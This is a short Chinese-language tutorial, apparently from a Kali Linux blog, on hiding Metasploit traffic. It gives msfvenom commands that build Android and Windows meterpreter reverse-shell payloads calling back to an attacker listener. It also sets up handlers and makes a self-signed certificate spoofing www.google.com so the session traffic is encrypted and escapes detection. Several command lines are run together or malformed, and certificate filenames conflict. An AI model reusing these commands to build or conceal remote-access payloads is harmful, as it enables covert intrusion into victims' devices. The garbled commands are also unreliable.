# 浅谈kali中对msf数据包的加密

> 在msf中生成shell，并上线运行时。都是通过`http` `https` `tcp`等协议传输。并没有加密，传输内容容易被检测和发现。

如下，我们简单生成一个Android平台的shell。

```

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.123.33 LPORT=5555 R > bbs.apk
```

**msf 配置信息如下：**

```


msfconsoleset
 payload android/meterpreter/reverse_tcpset
 LHOST 192.168.123.33set

 LPORT 5555
```

![](../Images/1938e406ad5f1f24c3da19c34140d718.png)

很容易发现，我们的操作都是已明文的形式传输。![](../Images/b89a43abc96f42d8f22375ce96d5aaa0.png)

### 加密msf流量

**创建证书**

```

openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \"/C=UK/ST=London/L=London/O=Development/CN=www.google.com"

 \
```

![](../Images/cfdc0fee6213555819e89d4bcdd2953c.png)注意：代码输入格式参考图片。这样会在桌面生成一个`www.bbskali.cn.pem`的证书![](../Images/f91dd49833df58cd441e1e99f3942a13.png)生成加密的shell

```
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.123.33 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem StagerVerifySSLCert=true

 PayloadUUIDName=ParanoidStagedPSH -f exe -o bbskali.exe
```

![](../Images/ab2ba8e5d6176c720d9aa629497d594b.png)**msf参数配置**

```

use exploit/multi/handlerset
 payload windows/meterpreter/reverse_winhttpsset
 lhost 192.168.123.33set
 lport 443set HandlerSSLCert www.google.com.pem #注意文件位置
set StagerVerifySSLCert true
 
```

![](../Images/10cef145cc2dd9f16ae395abd900cd87.png)

运行`shell`后，我们再次抓包。发现流量全是密文了。![](../Images/cb14acd73bb36283f4d3829191362359.png)
